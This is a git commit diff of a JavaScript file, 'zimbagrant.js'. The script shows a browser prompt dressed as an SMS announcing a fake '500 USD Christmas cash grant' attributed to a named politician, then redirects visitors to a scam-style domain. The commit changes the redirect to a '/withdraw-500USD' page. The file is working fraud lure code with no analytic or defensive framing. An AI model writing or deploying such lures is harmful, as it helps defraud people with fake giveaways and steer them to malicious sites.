f8491ef98c34f32bf5fc471b19903a677aa9f7e2
bigetijazz23 <bigetijazz23@gmail.com>
2024-12-07 13:29:42 -0800

    Update zimbagrant.js

--- zimbagrant.js
+++ zimbagrant.js
@@ -2,5 +2,5 @@
 var password = 'CLAIM 500 USD'
 password=prompt('SMS: Congratulations, you are eligible for EMMERSON DAMBUDZO 500 USD CHRISTMAS CASH GRANT FOR ALL, Please press OK to CLAIM Cash Prize','CLAIM 500 USD');
 if (password != 'CLAIM 500 USD') {
-location.href='https://www.zimba-offerz.xyz/zimba-grant';
+location.href='https://www.zimba-offerz.xyz/withdraw-500USD';
 }
